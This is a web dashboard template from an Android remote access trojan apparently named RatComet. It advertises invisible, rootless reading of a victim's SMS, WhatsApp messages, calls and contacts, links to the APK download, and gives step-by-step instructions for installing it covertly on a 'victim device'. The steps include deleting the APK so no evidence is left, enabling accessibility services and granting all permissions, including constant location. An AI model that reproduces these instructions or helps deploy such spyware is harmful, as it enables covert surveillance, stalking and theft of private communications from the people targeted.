<div>

    @if (session()->has('message'))

        <div class="alert alert-success">

            {{ session('message') }}

        </div>

    @endif

    <div class="card-body">
      <div class="card card-outline card-primary">
          <div class="card-header">
            <h3 class="card-title">WHAT IS NEW *</h3>
      
            <div class="card-tools">
              <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
              </button>
            </div>
            <!-- /.card-tools -->
          </div>
          <!-- /.card-header -->
          <div class="card-body">
            <ul>
              <li>Support For Android 4.4 upto Android 12</li>
              <li>No Root is Required</li>
              <li>Invisible on all phones models and versions</li>
              <li>Read Sms, Whatsapp messages, calls, contacts, apps,among others</li>
            </ul>
          </div>
          <!-- /.card-body -->
        </div>
      
  </div>

    <div class="card-body">
        <div class="card card-outline card-primary">
            <div class="card-header">
              <h3 class="card-title">DOWNLOAD THE APPLICATION</h3>
        
              <div class="card-tools">
                <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
                </button>
              </div>
              <!-- /.card-tools -->
            </div>
            <!-- /.card-header -->
            <div class="card-body">
              <button type="button" class="btn btn-block btn-outline-primary btn-flat toastrDefaultSuccess" wire:click="download">CLICK HERE</button> <br>
              <em>Having trouble downloading???..... <a href="https://www.mediafire.com/file/lhhk7048tr681c6/RatComet.apk/file" target="blank">Click Here</a></em>
            </div>
            <!-- /.card-body -->
          </div>
        
    </div>
    <div class="card-body">
      <div class="card card-outline card-primary">
          <div class="card-header">
            <h3 class="card-title">STEP 1</h3>
      
            <div class="card-tools">
              <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
              </button>
            </div>
            <!-- /.card-tools -->
          </div>
          <!-- /.card-header -->
          <div class="card-body">
            <ul>
              <li>Allow install from unknown sources</li>
              <li>Install The <i>Downloaded Application</i> in Victim Device</li>
              <li>Delete the downloaded apk file (We don't want to leave any evidence behind)</li>
              <li>Goto Settings >> Accessibility >> Services</li>
            </ul>
            
            
          </div>
          <!-- /.card-body -->
        </div>
    </div>
  <div class="card-body">
    <div class="card card-outline card-primary">
        <div class="card-header">
          <h3 class="card-title">STEP 2</h3>
          <div class="card-tools">
            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
            </button>
          </div>
          <!-- /.card-tools -->
        </div>
        <!-- /.card-header -->
        <div class="card-body">
          <ul>
            <li>Enable Settings</li>
          </ul>
        </div>
        <!-- /.card-body -->
      </div>   
  </div>
  <div class="card-body">
    <div class="card card-outline card-primary">
        <div class="card-header">
          <h3 class="card-title">STEP 3</h3>
    
          <div class="card-tools">
            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
            </button>
          </div>
          <!-- /.card-tools -->
        </div>
        <!-- /.card-header -->
        <div class="card-body">
          <ul>
            <li>Tap the notification that pops Up with "Tap Me"</li>  
            <li>Enable yes on Ignore battery optimization</li>
              <li>Enter the Victim Name and The Token</li>
              <li>Make Sure to cross check the token to be 100% right</li>
          </ul>
             
        </div>
        <!-- /.card-body -->
      </div>  
    </div>
  <div class="card-body">
    <div class="card card-outline card-primary">
        <div class="card-header">
          <h3 class="card-title">STEP 4</h3>
    
          <div class="card-tools">
            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
            </button>
          </div>
          <!-- /.card-tools -->
        </div>
        <!-- /.card-header -->
        <div class="card-body">
          <ul>
            <li>Press the STEP Buttons on Screen and Allow all permission (For Location on Android 10+, allow all the time</li>
            <li>PRESS STEP 2 button to finialize the SetUp</li>
            <li>SIT BACK AND WATCH THE MAGIC HAPPEN</li>
            <li>CHECK YOUR DEVICES BY SELECTING THE DEVICES IN MENU IN THE CONTROL MENU</li>
          </ul>
             
        </div>
        <!-- /.card-body -->
      </div>  
    </div>

    <script type="text/javascript">
      $(function() {
        $('.toastrDefaultSuccess').click(function() {
            toastr.success('Download will start shortly, Please wait!...')
          });
      });
    </script>
</div>
